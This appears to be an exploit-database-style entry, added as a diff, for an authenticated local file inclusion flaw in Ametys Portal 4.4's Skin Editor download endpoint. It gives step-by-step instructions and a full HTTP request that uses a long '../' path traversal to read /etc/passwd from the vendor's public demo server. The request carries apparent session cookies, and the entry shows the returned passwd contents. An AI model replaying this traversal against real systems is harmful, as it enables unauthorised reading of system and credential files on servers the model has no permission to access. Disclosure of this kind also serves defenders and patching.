@@ -1,0 +1,58 @@
+# Exploit Title: Ametys Portal 4.4 - Local File Inclusion
+# Date: 05.08.2025
+# Exploit Author: tmrswrr
+# Vendor Homepage: https://www.ametys.org
+# Software Link: https://www.ametys.org/community/en/download/ametys-portal/ametys-portal-4.html
+# Tested : https://www.ametys.org/community/en/ametys-platform/ametys-portal/online-demo.html
+# Version: 4.4
+# Category: Webapps
+
+
+# Exploit working with manager , webmaster and admin cred 
+1. Login with webmaster cred 
+2. Click Skin Editor > Resources > Img > any image file 
+3. Catch to request with burp suite , change path wit lfi papload 
+
+GET /cms/plugins/skineditor/file/download?path=../../../../../../../../../../../../../../../../etc/passwd&skinName=demo HTTP/1.1
+Host: demo.ametys.org
+Cookie: JSESSIONID=3F87581AEF2EC304640A09D7094D98EE; AmetysAuthentication=YW1ldHlzX2RlbW9fdXNlcnMjd2VibWFzdGVyI05ycnY0RlVPeXgwcENOVEk; tarteaucitron=!gajs=false!matomocloud=false!googlemaps=false!gagenda=false!sharethis=false!dailymotion=false!youtube=false!youtubeplaylist=false; JSESSIONID=DC788DBC176BFB0787DA25FC2C93CE63; _pk_id.2.afd3=4f757134bce0bed6.1754326045.; _ga_2VTM1RYFX8=GS2.1.s1754331048$o1$g1$t1754331054$j54$l0$h0; JSESSIONID-Ametys=719D9B1BA49FE4046DFB966F28FBB385
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://demo.ametys.org/cms/www/index.html
+Dnt: 1
+Sec-Gpc: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+4. Result  
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
